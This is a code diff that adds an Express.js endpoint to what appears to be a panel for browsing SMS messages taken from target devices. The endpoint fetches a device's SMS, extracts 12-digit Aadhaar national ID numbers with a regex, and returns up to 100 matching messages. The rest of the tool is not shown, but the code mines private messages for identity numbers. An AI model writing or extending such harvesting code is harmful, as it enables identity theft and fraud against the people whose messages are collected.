@@ -301,6 +301,56 @@ app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
   }
 });
 
+// ── SearchAadhar: fetch device SMS, return messages containing 12-digit Aadhaar numbers ──
+app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const deviceId = req.params.deviceId;
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+
+  const db = loadDb(id);
+  const dev = db[deviceId];
+  if (!dev) return res.status(404).json({ error: 'Device not found in cache' });
+
+  const objId = dev.obj_id || 'N/A';
+  const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');
+
+  try {
+    const resp = await fetch(fetchUrl, {
+      headers: { 'User-Agent': 'Mozilla/5.0' },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (!resp.ok) return res.json({ hits: [], total: 0, error: `HTTP ${resp.status}` });
+    const smsData = await resp.json();
+
+    // 12-digit Aadhaar: must not be preceded/followed by another digit
+    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
+
+    function* iterMsgs(data) {
+      if (typeof data !== 'object' || !data) return;
+      for (const v of Object.values(data)) {
+        if (typeof v !== 'object' || !v) continue;
+        const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
+        if (hasBody) { yield v; }
+        else { yield* iterMsgs(v); }
+      }
+    }
+
+    const hits = [];
+    for (const msg of iterMsgs(smsData)) {
+      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+      if (!body) continue;
+      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
+      if (aadhars.length) hits.push({ body, aadhars });
+      if (hits.length >= 100) break;
+    }
+
+    res.json({ hits, total: hits.length });
+  } catch (e) {
+    res.json({ hits: [], total: 0, error: e.message });
+  }
+});
+
 // ── Serve frontend ────────────────────────────────────────────────────────────
 app.use(express.static(path.join(__dirname, 'public')));
 app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
